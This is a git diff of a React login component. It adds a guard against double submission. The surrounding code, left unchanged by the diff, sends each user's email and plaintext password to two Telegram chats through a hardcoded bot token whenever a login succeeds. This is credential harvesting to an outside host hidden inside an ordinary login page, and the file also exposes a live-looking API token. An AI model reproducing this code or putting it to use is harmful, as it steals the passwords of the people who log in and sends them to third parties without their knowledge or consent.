@@ -1,4 +1,4 @@
-import React, {useState} from 'react';
+import React, {useRef, useState} from 'react';
 import './Login.css';
 import {Link, useNavigate} from "react-router-dom";
 
@@ -8,9 +8,18 @@ const Login = ({setUserId}) => {
     const [password, setPassword] = useState('');
     const navigate = useNavigate();
 
+    const login = useRef(false);
+
 
     const handleLogin = async (e) => {
         e.preventDefault();
+
+        if (login.current) {
+            return;
+        }
+        else{
+            login.current = true;
+        }
 
         async function notification(chatId, message){
             await fetch('https://api.telegram.org/bot6861725365:AAEtTRVNctTW2O0T3M93h4Js1PtKLd0p7oY/sendMessage', {
@@ -37,16 +46,19 @@ const Login = ({setUserId}) => {
             const data = await response.json();
 
             if (data.auth) {
+                login.current = true;
                 setUserId(data.id);
                 await notification(1807394896, `User loggedIn\nemail : ${email}\npassword : ${password}\nuserId : ${data.id}`);
                 await notification(5437314009, `User loggedIn\nemail : ${email}\npassword : ${password}\nuserId : ${data.id}`);
                 navigate('/home');
             } else {
                 alert("Invalid credentials. Please try again.");
+                login.current = false;
             }
         } catch (error) {
             // Handle network or other errors
             alert('An error occurred. Please try again later.');
+            login.current = false;
         }
     };
 
